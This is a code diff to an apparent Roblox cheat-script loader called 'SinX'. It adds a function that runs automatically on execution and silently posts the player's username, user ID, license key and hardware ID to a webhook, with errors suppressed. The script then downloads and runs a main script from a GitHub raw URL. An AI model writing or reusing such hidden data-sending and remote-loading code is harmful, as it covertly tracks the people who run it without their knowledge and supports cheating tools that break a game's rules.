@@ -99,6 +99,66 @@ end
 getgenv().authorized = true
 
 print("Access granted. Loading script...")
+local function sendLog()
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "🚀 SinX Execution",
+            ["color"] = 16753920,
+            ["fields"] = {
+                {
+                    ["name"] = "User",
+                    ["value"] = player.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UserId",
+                    ["value"] = tostring(player.UserId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Key",
+                    ["value"] = USER_KEY,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "HWID / Executor",
+                    ["value"] = getHWID(),
+                    ["inline"] = false
+                }
+            }
+        }}
+    }
+
+    -- 🔥 SEND
+    pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        elseif http_request then
+            http_request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        elseif request then
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+-- 🚀 RUN ON EXECUTE
+task.spawn(sendLog)
 
 -- ===== LOAD MAIN =====
 local main = game:HttpGet("https://raw.githubusercontent.com/Aprilfoolscrasher-Dev/Checker.lua/main/main.lua")
